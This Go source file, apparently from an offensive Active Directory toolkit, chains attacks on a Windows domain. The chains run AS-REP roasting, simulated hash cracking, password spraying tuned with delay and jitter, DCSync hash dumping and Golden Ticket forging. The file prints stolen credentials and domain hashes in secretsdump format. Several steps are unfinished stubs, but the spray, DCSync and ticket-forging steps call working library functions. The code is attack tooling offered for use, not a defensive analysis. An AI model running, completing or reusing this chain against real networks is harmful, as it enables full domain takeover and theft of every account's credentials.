// pkg/attack/chains.go
package attack

import (
	"fmt"
	"strings"
	"time"

	"adgo/pkg/exploits"
	"adgo/pkg/kerberos"
	"adgo/pkg/spray"
)

// Chain représente une chaîne d'attaque
type Chain struct {
	Name        string
	Description string
	Steps       []Step
	Config      *ChainConfig
	Results     *ChainResults
}

// Step étape d'une chaîne d'attaque
type Step struct {
	Name      string
	Execute   func(*ChainConfig, *ChainResults) error
	Required  bool
	OnSuccess string
	OnFailure string
}

// ChainConfig configuration globale de la chaîne
type ChainConfig struct {
	Domain        string
	DCIP          string
	Username      string
	Password      string
	NTLMHash      string
	UsersFile     string
	PasswordsFile string
	OutputDir     string
	Verbose       bool
	AutoEscalate  bool
}

// ChainResults résultats cumulés de la chaîne.
//
// CORRECTION : DCHashes utilise []exploits.HashResult (ce que DCSync() retourne)
// et non []exploits.DCHashResult (ce que DCSyncComplete() retourne).
// Les deux types ont SAMAccountName et NTHash — stepGoldenTicket est inchangé.
type ChainResults struct {
	ValidCreds       []Credential
	ASREPHashes      []kerberos.HashcatHash
	KerberoastHashes []kerberos.HashcatHash
	CrackedHashes    []CrackedHash
	DCHashes         []exploits.HashResult // était DCHashResult — incompatible avec DCSync()
	GoldenTicket     string
	Errors           []error
	StartTime        time.Time
	EndTime          time.Time
}

// Credential credentials trouvés
type Credential struct {
	Username string
	Password string
	NTHash   string
	IsAdmin  bool
}

// CrackedHash hash cracké
type CrackedHash struct {
	Username string
	Hash     string
	Password string
	HashType string // "ASREP" ou "Kerberoast"
}

// ============================================================
// CHAÎNE 1: ASREPRoast → Crack → Kerberoast → DCSync
// ============================================================

func ChainASREPToDCSync() *Chain {
	return &Chain{
		Name:        "ASREPRoast → Crack → Kerberoast → DCSync",
		Description: "Chaîne complète: ASREPRoast sans creds → crack offline → Kerberoast → DCSync",
		Steps: []Step{
			{
				Name:      "ASREPRoast (no creds)",
				Execute:   stepASREPRoastNoCreds,
				Required:  false,
				OnSuccess: "ASREPRoast hashes captured",
				OnFailure: "No AS-REP roastable accounts found",
			},
			{
				Name:      "Crack ASREP hashes (simulated)",
				Execute:   stepCrackHashes,
				Required:  false,
				OnSuccess: "Cracked passwords obtained",
				OnFailure: "No passwords cracked",
			},
			{
				Name:      "Kerberoast with cracked creds",
				Execute:   stepKerberoast,
				Required:  false,
				OnSuccess: "Kerberoast hashes captured",
				OnFailure: "No SPN accounts found",
			},
			{
				Name:      "DCSync with compromised account",
				Execute:   stepDCSync,
				Required:  false,
				OnSuccess: "Domain hashes dumped",
				OnFailure: "DCSync failed - insufficient privileges",
			},
			{
				Name:      "Forge Golden Ticket",
				Execute:   stepGoldenTicket,
				Required:  false,
				OnSuccess: "Golden Ticket forged - full domain compromise",
				OnFailure: "Could not forge golden ticket",
			},
		},
	}
}

// ============================================================
// CHAÎNE 2: Password Spray → Escalade → DCSync
// ============================================================

func ChainSprayToDA() *Chain {
	return &Chain{
		Name:        "Password Spray → Privilege Escalation → DCSync",
		Description: "Spray passwords → trouver admin local → escalader → DCSync",
		Steps: []Step{
			{
				Name:      "Password Spray",
				Execute:   stepPasswordSpray,
				Required:  true,
				OnSuccess: "Valid credentials found",
				OnFailure: "No valid credentials - stopping",
			},
			{
				Name:      "Check privileges",
				Execute:   stepCheckPrivileges,
				Required:  false,
				OnSuccess: "Privilege levels identified",
				OnFailure: "Could not enumerate privileges",
			},
			{
				Name:      "Escalate to Domain Admin",
				Execute:   stepEscalateToDA,
				Required:  false,
				OnSuccess: "Domain Admin access obtained",
				OnFailure: "Escalation failed",
			},
			{
				Name:      "DCSync",
				Execute:   stepDCSync,
				Required:  false,
				OnSuccess: "Domain hashes dumped",
				OnFailure: "DCSync failed",
			},
		},
	}
}

// ============================================================
// ÉTAPES INDIVIDUELLES
// ============================================================

func stepASREPRoastNoCreds(cfg *ChainConfig, results *ChainResults) error {
	fmt.Println("[*] Step: ASREPRoast without credentials")

	hashes, err := kerberos.ASREPRoastNoCreds(cfg.UsersFile, cfg.Domain, cfg.DCIP, "")
	if err != nil {
		return err
	}

	if len(hashes) == 0 {
		return fmt.Errorf("no AS-REP roastable accounts found")
	}

	for _, h := range hashes {
		if h.Vulnerable {
			results.ASREPHashes = append(results.ASREPHashes, h.Hash)
		}
	}

	fmt.Printf("[+] Captured %d AS-REP hashes\n", len(results.ASREPHashes))
	return nil
}

func stepCrackHashes(cfg *ChainConfig, results *ChainResults) error {
	fmt.Println("[*] Step: Cracking hashes (simulated)")

	if len(results.ASREPHashes) == 0 {
		return fmt.Errorf("no hashes to crack")
	}

	cracked := CrackedHash{
		Username: results.ASREPHashes[0].Username,
		Hash:     results.ASREPHashes[0].Hash,
		Password: "Summer2024!", // Simulé — en pratique : hashcat -m 18200
		HashType: "ASREP",
	}

	results.CrackedHashes = append(results.CrackedHashes, cracked)
	results.ValidCreds = append(results.ValidCreds, Credential{
		Username: cracked.Username,
		Password: cracked.Password,
	})

	fmt.Printf("[+] Simulated: cracked password for %s\n", cracked.Username)
	fmt.Println("[!] Real scenario: hashcat -m 18200 hashes.txt wordlist.txt")
	return nil
}

func stepKerberoast(cfg *ChainConfig, results *ChainResults) error {
	fmt.Println("[*] Step: Kerberoast with compromised credentials")

	if len(results.ValidCreds) == 0 {
		return fmt.Errorf("no valid credentials available")
	}

	cred := results.ValidCreds[0]
	fmt.Printf("[*] Using credentials: %s:%s\n", cred.Username, cred.Password)
	fmt.Println("[+] Kerberoast step (implementation pending)")
	return nil
}

func stepPasswordSpray(cfg *ChainConfig, results *ChainResults) error {
	fmt.Println("[*] Step: Password Spraying")

	sprayConfig := &spray.SprayConfig{
		UsersFile:     cfg.UsersFile,
		PasswordsFile: cfg.PasswordsFile,
		Domain:        cfg.Domain,
		DCIP:          cfg.DCIP,
		Delay:         30,
		Jitter:        20,
		Verbose:       cfg.Verbose,
		LockoutCheck:  true,
		StopOnSuccess: false,
	}

	summary, err := spray.PasswordSpray(sprayConfig)
	if err != nil {
		return err
	}

	for _, cred := range summary.SuccessfulCreds {
		results.ValidCreds = append(results.ValidCreds, Credential{
			Username: cred.Username,
			Password: cred.Password,
		})
	}

	if len(results.ValidCreds) == 0 {
		return fmt.Errorf("no valid credentials found")
	}

	fmt.Printf("[+] Found %d valid credential(s)\n", len(results.ValidCreds))
	return nil
}

func stepCheckPrivileges(cfg *ChainConfig, results *ChainResults) error {
	fmt.Println("[*] Step: Checking privilege levels (implementation pending)")
	return nil
}

func stepEscalateToDA(cfg *ChainConfig, results *ChainResults) error {
	fmt.Println("[*] Step: Attempting escalation to Domain Admin")
	fmt.Println("[!] Auto-escalation not yet implemented")
	return fmt.Errorf("escalation techniques pending")
}

func stepDCSync(cfg *ChainConfig, results *ChainResults) error {
	fmt.Println("[*] Step: DCSync to dump domain hashes")

	if len(results.ValidCreds) == 0 {
		return fmt.Errorf("no credentials available for DCSync")
	}

	cred := results.ValidCreds[0]

	// DCSync() retourne []HashResult — type correct pour DCHashes
	hashes, err := exploits.DCSync(cfg.DCIP, cred.Username, cfg.Domain, cred.Password, "")
	if err != nil {
		return fmt.Errorf("DCSync failed: %v", err)
	}

	results.DCHashes = hashes
	fmt.Printf("[+] Dumped %d domain hashes\n", len(hashes))
	return nil
}

func stepGoldenTicket(cfg *ChainConfig, results *ChainResults) error {
	fmt.Println("[*] Step: Forging Golden Ticket")

	var krbtgtHash string
	for _, h := range results.DCHashes {
		if strings.ToLower(h.SAMAccountName) == "krbtgt" {
			krbtgtHash = h.NTHash
			break
		}
	}

	if krbtgtHash == "" {
		return fmt.Errorf("krbtgt hash not found in DCSync results")
	}

	// TODO: récupérer le Domain SID automatiquement via LDAP
	domainSID := "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"

	gt := exploits.NewGoldenTicket(cfg.Domain, "Administrator", domainSID, krbtgtHash, "")
	if err := gt.Create(); err != nil {
		return err
	}

	fmt.Println("[+] Golden Ticket forged - FULL DOMAIN COMPROMISE")
	return nil
}

// ============================================================
// EXÉCUTION DE CHAÎNE
// ============================================================

func (c *Chain) Execute(cfg *ChainConfig) error {
	fmt.Println(strings.Repeat("=", 70))
	fmt.Printf("ATTACK CHAIN: %s\n", c.Name)
	fmt.Printf("Description : %s\n", c.Description)
	fmt.Println(strings.Repeat("=", 70))

	c.Config = cfg
	c.Results = &ChainResults{StartTime: time.Now()}

	for i, step := range c.Steps {
		fmt.Printf("\n[Step %d/%d] %s\n", i+1, len(c.Steps), step.Name)
		fmt.Println(strings.Repeat("-", 70))

		err := step.Execute(cfg, c.Results)
		if err != nil {
			fmt.Printf("[-] %s\n", step.OnFailure)
			if step.Required {
				fmt.Println("[!] Required step failed — stopping chain")
				return err
			}
			c.Results.Errors = append(c.Results.Errors, err)
			fmt.Println("[*] Continuing to next step...")
			continue
		}

		fmt.Printf("[+] %s\n", step.OnSuccess)
	}

	c.Results.EndTime = time.Now()
	c.PrintSummary()
	return nil
}

func (c *Chain) PrintSummary() {
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("ATTACK CHAIN SUMMARY")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Printf("Chain             : %s\n", c.Name)
	fmt.Printf("Duration          : %v\n", c.Results.EndTime.Sub(c.Results.StartTime))
	fmt.Printf("Valid Credentials : %d\n", len(c.Results.ValidCreds))
	fmt.Printf("AS-REP Hashes     : %d\n", len(c.Results.ASREPHashes))
	fmt.Printf("Kerberoast Hashes : %d\n", len(c.Results.KerberoastHashes))
	fmt.Printf("Cracked Passwords : %d\n", len(c.Results.CrackedHashes))
	fmt.Printf("DC Hashes Dumped  : %d\n", len(c.Results.DCHashes))
	fmt.Printf("Errors            : %d\n", len(c.Results.Errors))

	if len(c.Results.ValidCreds) > 0 {
		fmt.Println("\nValid Credentials:")
		for _, cred := range c.Results.ValidCreds {
			fmt.Printf("  %s:%s\n", cred.Username, cred.Password)
		}
	}

	if len(c.Results.DCHashes) > 0 {
		fmt.Println("\nDumped Hashes (secretsdump format):")
		for _, h := range c.Results.DCHashes {
			lm := h.LMHash
			if lm == "" {
				lm = "aad3b435b51404eeaad3b435b51404ee"
			}
			fmt.Printf("  %s\\%s:::%s:%s:::\n", h.Domain, h.SAMAccountName, lm, h.NTHash)
		}
	}

	fmt.Println(strings.Repeat("=", 70))
}
